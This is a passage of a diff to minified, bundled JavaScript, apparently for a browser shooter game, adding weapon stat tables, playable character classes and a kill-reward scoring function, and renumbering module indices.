+        range: 700,
+        dmgDrop: 12,
+        scale: 1.1,
+        leftHoldY: -.4,
+        leftHoldX: -.1,
+        rightHoldY: -.5,
+        leftHoldZ: 1.1,
+        rightHoldZ: -.95,
+        xOff: .95,
+        yOff: -.95,
+        zOff: -3,
+        xOrg: 0,
+        yOrg: -.57,
+        zOrg: -2.5,
+        cRot: .4,
+        cLean: .4,
+        inspectR: .4,
+        inspectM: 1.3,
+        caseYOff: -.15,
+        caseZOff: -.4,
+        muzOff: 2.15,
+        muzOffY: .1,
+        rate: 90,
+        spread: 170,
+        minSpread: 10,
+        zoom: 1.5,
+        leanMlt: 1,
+        recoil: .0034,
+        recoilR: .015,
+        recover: .978,
+        recoverY: .996,
+        recoverF: .975,
+        recoilY: .3,
+        recoilZ: 3.8
+    }, {
+        name: "Revolver",
+        src: "weapon_5",
+        icon: "icon_5",
+        sound: "weapon_5",
+        nAuto: !0,
+        nCase: !0,
+        transp: !0,
+        kill: ["", 50],
+        type: 1,
+        swapTime: 200,
+        aimSpeed: 120,
+        spdMlt: 1.04,
+        ammo: 6,
+        reload: 900,
+        dmg: 66,
+        pierce: .85,
+        dmgDrop: 10,
+        scale: 1.3,
+        leftHoldY: -1,
+        rightHoldY: -.8,
+        leftHoldZ: -.5,
+        rightHoldZ: -.5,
+        xOff: .7,
+        yOff: -.8,
+        zOff: -4.1,
+        xOrg: 0,
+        yOrg: -.35,
+        zOrg: -3.8,
+        cLean: .5,
+        cRot: .4,
+        cDrop: .1,
+        inspectR: .4,
+        inspectM: .3,
+        muzOff: 2.75,
+        muzOffY: .2,
+        muzMlt: .95,
+        range: 700,
+        rate: 300,
+        spread: 100,
+        zoom: 1.4,
+        leanMlt: 1.6,
+        recoil: .013,
+        recoilR: .012,
+        recover: .982,
+        recoverY: .992,
+        recoverF: .98,
+        recoilY: 1.5,
+        recoilZ: 2
+    }, {
+        name: "Shotgun",
+        src: "weapon_6",
+        icon: "icon_6",
+        sound: "weapon_6",
+        nAuto: !0,
+        nCase: !0,
+        nRing: !0,
+        type: 0,
+        swapTime: 300,
+        aimSpeed: 180,
+        spdMlt: 1,
+        ammo: 2,
+        shots: 5,
+        reload: 1100,
+        dmg: 50,
+        dmgDrop: 40,
+        scale: 1.25,
+        leftHoldY: -.7,
+        rightHoldY: -.9,
+        leftHoldZ: 1.2,
+        rightHoldZ: -.3,
+        xOff: .95,
+        yOff: -.8,
+        zOff: -3,
+        xOrg: 0,
+        yOrg: -.2,
+        zOrg: -1.5,
+        cLean: .5,
+        cRot: .4,
+        cDrop: .1,
+        inspectR: .4,
+        inspectM: .6,
+        muzOff: 6,
+        muzMlt: 1.5,
+        range: 240,
+        rate: 400,
+        innac: 110,
+        spread: 120,
+        minSpread: 20,
+        zoom: 1.25,
+        leanMlt: 1.6,
+        recoil: .013,
+        recoilR: .015,
+        recover: .99,
+        recoverF: .975,
+        recoilY: .8,
+        recoilZ: 2
+    }, {
+        name: "Light Machine Gun",
+        src: "weapon_7",
+        icon: "icon_7",
+        sound: "weapon_7",
+        transp: !0,
+        type: 0,
+        swapTime: 800,
+        aimSpeed: 200,
+        spdMlt: .79,
+        ammo: 100,
+        reload: 2500,
+        dmg: 22,
+        pierce: 1,
+        range: 700,
+        dmgDrop: 10,
+        scale: 1.3,
+        leftHoldY: -.65,
+        leftHoldX: .4,
+        rightHoldY: -.75,
+        leftHoldZ: 1,
+        rightHoldZ: -.2,
+        xOff: .95,
+        yOff: -.8,
+        zOff: -2.8,
+        xOrg: 0,
+        yOrg: -.45,
+        zOrg: -2,
+        cLean: .3,
+        cRot: .4,
+        cDrop: 0,
+        inspectR: .4,
+        inspectM: .6,
+        caseInd: 2,
+        caseZOff: -.5,
+        caseYOff: -.1,
+        muzOff: 5.5,
+        muzMlt: 1.65,
+        rate: 120,
+        spread: 300,
+        minSpread: 15,
+        zoom: 1.2,
+        leanMlt: 1.6,
+        recoil: .0032,
+        recoilR: .012,
+        recover: .98,
+        recoverY: .9975,
+        recoverF: .975,
+        recoilY: .4,
+        recoilZ: 3.8
+    }, {
+        name: "Semi Auto",
+        src: "weapon_8",
+        icon: "icon_8",
+        sound: "weapon_8",
+        nAuto: !0,
+        type: 0,
+        scope: !0,
+        swapTime: 400,
+        aimSpeed: 120,
+        spdMlt: 1,
+        ammo: 8,
+        reload: 1300,
+        dmg: 35,
+        pierce: .2,
+        range: 1e3,
+        dmgDrop: 0,
+        scale: 1,
+        leftHoldY: -.7,
+        rightHoldY: -.75,
+        leftHoldZ: 2.4,
+        rightHoldZ: .4,
+        xOff: .8,
+        yOff: -.75,
+        zOff: -2,
+        xOrg: 0,
+        yOrg: -.55,
+        zOrg: -.8,
+        cLean: .5,
+        cRot: .4,
+        cDrop: .1,
+        inspectR: .4,
+        inspectM: .3,
+        muzOff: 5.7,
+        muzOffY: .5,
+        muzMlt: 1.4,
+        rate: 220,
+        spread: 300,
+        zoom: 2.4,
+        leanMlt: 2,
+        recoil: .01,
+        recoilR: .01,
+        recover: .984,
+        recoverY: .997,
+        recoverF: .975,
+        recoilY: .4,
+        recoilZ: 1.8
+    }, {
+        name: "Rocket Launcher",
+        src: "weapon_9",
+        icon: "icon_9",
+        sound: "weapon_9",
+        nInsp: !0,
+        nSkill: !0,
+        nAuto: !0,
+        nCase: !0,
+        nRing: !0,
+        projectile: 0,
+        type: 0,
+        swapTime: 600,
+        aimSpeed: 200,
+        spdMlt: .9,
+        ammo: 1,
+        reload: 1600,
+        scale: 1.3,
+        leftHoldY: -.5,
+        rightHoldY: -.6,
+        leftHoldZ: 3.2,
+        rightHoldZ: 1.6,
+        xOff: .95,
+        yOff: -.4,
+        zOff: -.7,
+        xOrg: 0,
+        yOrg: -.6,
+        zOrg: -1.5,
+        cLean: .2,
+        cRot: .2,
+        cDrop: .1,
+        muzOff: 5,
+        muzOffY: 0,
+        muzMlt: 1.5,
+        rate: 1,
+        spread: 120,
+        minSpread: 15,
+        zoom: 1.5,
+        leanMlt: 1.4,
+        recoil: .008,
+        recoilR: .012,
+        recover: .99,
+        recoverY: .998,
+        recoverF: .975,
+        recoilY: .8,
+        recoilZ: 4
+    }, {
+        name: "Akimbo Uzi",
+        src: "weapon_10",
+        icon: "icon_10",
+        sound: "weapon_10",
+        nInsp: !0,
+        noAim: !0,
+        akimbo: !0,
+        type: 0,
+        swapTime: 300,
+        aimSpeed: 120,
+        spdMlt: 1.04,
+        ammo: 18,
+        reload: 1200,
+        dmg: 18,
+        pierce: 1,
+        range: 700,
+        dmgDrop: 12,
+        scale: .9,
+        rightHoldY: -.55,
+        leftHoldZ: .3,
+        leftHoldX: -.25,
+        leftHoldY: -.55,
+        rightHoldZ: .3,
+        rightHoldX: -.25,
+        holdW: 1.3,
+        xOff: 1.5,
+        yOff: -.95,
+        zOff: -3.3,
+        xOrg: 0,
+        yOrg: -.62,
+        zOrg: -2.5,
+        zLnM: .4,
+        cLean: .1,
+        cRot: .1,
+        cDrop: .2,
+        caseYOff: -.15,
+        caseZOff: -.4,
+        muzOff: 3.6,
+        rate: 60,
+        spread: 40,
+        spreadInc: 1.5,
+        minSpread: 10,
+        zoom: 1.5,
+        leanMlt: 1,
+        recoil: .0034,
+        recoilR: .015,
+        recover: .978,
+        recoverY: .996,
+        recoverF: .975,
+        recoilY: .3,
+        recoilZ: 5
+    }, {
+        name: "Desert Eagle",
+        src: "weapon_11",
+        icon: "icon_11",
+        sound: "weapon_11",
+        secondary: !0,
+        minRec: 15,
+        nAuto: !0,
+        transp: !0,
+        kill: ["", 50],
+        type: 1,
+        swapTime: 200,
+        aimSpeed: 120,
+        spdMlt: 1,
+        ammo: 6,
+        reload: 1e3,
+        dmg: 50,
+        pierce: .85,
+        dmgDrop: 10,
+        scale: .94,
+        leftHoldY: -.9,
+        rightHoldY: -.7,
+        leftHoldZ: -.5,
+        rightHoldZ: -.5,
+        holdW: .95,
+        xOff: 1.3,
+        yOff: -.95,
+        zOff: -4.1,
+        xOrg: 0,
+        yOrg: -.2,
+        zOrg: -3.8,
+        cLean: .5,
+        cRot: .8,
+        cDrop: .1,
+        inspectR: .5,
+        inspectM: .9,
+        muzOff: 2,
+        muzMlt: 1.1,
+        range: 700,
+        rate: 400,
+        spread: 150,
+        zoom: 1.4,
+        leanMlt: 1.6,
+        recoil: .01,
+        recoilR: .01,
+        recover: .985,
+        recoverY: .996,
+        recoverF: .98,
+        recoilY: 1.4,
+        recoilZ: 2
+    }, {
+        name: "Alien Blaster",
+        src: "weapon_13",
+        icon: "icon_13",
+        sound: "weapon_13",
+        secondary: !0,
+        nRing: !0,
+        nAuto: !0,
+        transp: !0,
+        nCase: !0,
+        minRec: 50,
+        kill: ["", 50],
+        type: 1,
+        swapTime: 200,
+        aimSpeed: 120,
+        spdMlt: 1,
+        ammo: 4,
+        reload: 1500,
+        dmg: 50,
+        pierce: .85,
+        dmgDrop: 10,
+        scale: 1.1,
+        leftHoldY: -1,
+        rightHoldY: -.65,
+        leftHoldZ: -.2,
+        rightHoldZ: -.2,
+        xOff: 1.3,
+        yOff: -.95,
+        zOff: -4.1,
+        xOrg: 0,
+        yOrg: -.6,
+        zOrg: -3.8,
+        cLean: .4,
+        cRot: .6,
+        cDrop: 0,
+        inspectR: .5,
+        inspectM: .8,
+        holdW: .7,
+        muzOff: 2.2,
+        muzOffY: .1,
+        muzID: 3,
+        muzMlt: 1.1,
+        range: 700,
+        rate: 150,
+        spread: 150,
+        zoom: 1.4,
+        leanMlt: 1.6,
+        recoil: .007,
+        recoilR: .01,
+        recover: .985,
+        recoverY: .996,
+        recoverF: .98,
+        recoilY: 1.05,
+        recoilZ: 2
+    }, {
+        name: "Hands",
+        melee: !0,
+        nInsp: !0,
+        type: 1,
+        swapTime: 350,
+        spdMlt: 1.1,
+        spread: 100,
+        leftHoldY: -.82,
+        leftHoldX: 1.3,
+        rightHoldX: -1.3,
+        rightHoldY: -.82,
+        leftHoldZ: -.5,
+        rightHoldZ: -.5,
+        xOff: 0,
+        yOff: -.95,
+        zOff: -3,
+        xOrg: 0,
+        yOrg: 0,
+        zOrg: 0,
+        leanMlt: 1
+    }]
+}, function(t, e) {
+    t.exports = [{
+        name: "Triggerman",
+        loadout: [1],
+        secondary: !0,
+        colors: [10975328, 4013373, 2302755, 2631720, 7098434, 12566463],
+        health: 100,
+        speed: 1.05
+    }, {
+        name: "Hunter",
+        loadout: [0],
+        secondary: !0,
+        colors: [10975328, 8083261, 6506290, 2631720, 6506290, 6506290],
+        health: 60,
+        speed: 1.05
+    }, {
+        name: "Run N Gun",
+        loadout: [3],
+        colors: [10975328, 4088706, 3099491, 2631720, 6506290, 3099491],
+        health: 100,
+        speed: 1.18
+    }, {
+        name: "Spray N Pray",
+        loadout: [6],
+        colors: [10975328, 5793865, 4806204, 2631720, 2631720, 4806204],
+        health: 170,
+        speed: 1
+    }, {
+        name: "Vince",
+        loadout: [5],
+        secondary: !0,
+        colors: [8412234, 5526119, 4144461, 2631720, 2631720, 4144461],
+        health: 100,
+        speed: 1
+    }, {
+        name: "Detective",
+        loadout: [4],
+        colors: [10975328, 7360054, 6308654, 2631720, 6506290, 6308654],
+        health: 100,
+        speed: 1
+    }, {
+        name: "Marksman",
+        loadout: [7],
+        secondary: !0,
+        colors: [10975328, 5793865, 4806204, 2631720, 2631720, 4806204],
+        health: 100,
+        speed: 1
+    }, {
+        name: "Rocketeer",
+        loadout: [8],
+        secondary: !0,
+        colors: [10975328, 5793865, 4806204, 2631720, 7098434, 4806204],
+        health: 130,
+        speed: .86
+    }, {
+        name: "Agent",
+        loadout: [9],
+        colors: [10975328, 4013373, 2302755, 2631720, 2631720, 12566463],
+        health: 100,
+        speed: 1.2
+    }, {
+        name: "Runner",
+        hide: !0,
+        loadout: [12],
+        colors: [10975328, 4013373, 2302755, 2631720, 2631720, 2302755],
+        health: 100,
+        speed: 1
+    }, {
+        name: "Deagler",
+        hide: !0,
+        loadout: [10],
+        colors: [10975328, 4013373, 2302755, 2631720, 2631720, 2302755],
+        health: 60,
+        speed: 1
+    }]
+}, function(t, e) {
+    t.exports = [{
         name: "Nuke",
         kills: 25,
         activate: function(t, e) {
@@ -48136,7 +48133,7 @@
         opacity: .6
     }]
 }, function(t, e, i) {
-    var n = i(4),
+    var n = i(5),
         r = i(1),
         s = function() {
             this.init = function(t, e, i, n, r, s, o) {
@@ -48180,6 +48177,28 @@
                 } if (o || ((o = new s).sid = this.projectiles.length, this.projectiles.push(o)), o.init(i, n, r, a, c, this.types[l], p), e)
                 for (h = 0; h < t.players.list.length; ++h)(t.players.list[h].active || t.players.list[h].spectating) && e.send(t.players.list[h].id, "pr", i, n, r, a, c, l, o.sid)
         }
+    }
+}, function(t, e) {
+    var i = ["Double Kill", "Triple Kill", "Quad Kill", "Multi Kill", "Mega Kill", "Ultra Kill", "Super Kill"],
+        n = [];
+    t.exports.reward = function(t, e, r, s, o) {
+        if (n.length = 0, e.weapon.melee) n.push("Execution", 300);
+        else {
+            e.weapon.kill ? n.push(e.weapon.kill[0], e.weapon.kill[1]) : e.weapon.scope && 1 == e.aimVal ? n.push("No Scope", 100) : !e.weapon.scope || 0 == e.aimVal && 180 < e.aimTime || 1 == e.aimDir ? n.push("", 50) : n.push("Quick Scope", 75), 1 >= o.kills && n.push("First Blood", 25);
+            var a = t.getSpin(e);
+            !e.weapon.nSkill && 360 <= a && n.push("360!", 150), s.headShot && n.push("Headshot", 50), !e.weapon.scope && 200 < s.dst * e.weapon.range && n.push("Longshot", 25)
+        }
+        e.health <= .2 * e.maxHealth && e.active && n.push("Close Call", 20), 5 <= e.deathStreak && n.push("Comeback", 25), 10 <= r.killStreak ? n.push("Buzzkill", 25) : 5 <= r.killStreak && n.push("Buzzkill", 10), 0 < e.slideTimer && n.push("Driftkill", 50), 400 <= e.airTime && n.push("Mid Air", 25);
+        for (var c = i.length - 1; 0 <= c; --c)
+            if (e.streak > c) {
+                n.push(i[c], 50 * (c + 1));
+                break
+            } return n.length ? n : null
+    }, t.exports.getScore = function(t) {
+        var e = 0;
+        if (t)
+            for (var i = 1; i < t.length; i += 2) e += t[i];
+        return e
     }
 }, function(t, e, i) {
     i(2);
@@ -48337,8 +48356,8 @@
         }
     }
 }, function(t, e, i) {
-    const n = i(97).words,
-        r = i(98).array;
+    const n = i(96).words,
+        r = i(97).array;
     t.exports = class {
         constructor(t = {}) {
             Object.assign(this, {
@@ -48377,9 +48396,9 @@
     }
 }, function(t, e, i) {
     t.exports = {
-        object: i(99),
-        array: i(100),
-        regex: i(101)
+        object: i(98),
+        array: i(99),
+        regex: i(100)
     }
 }, function(t, e) {
     t.exports = {
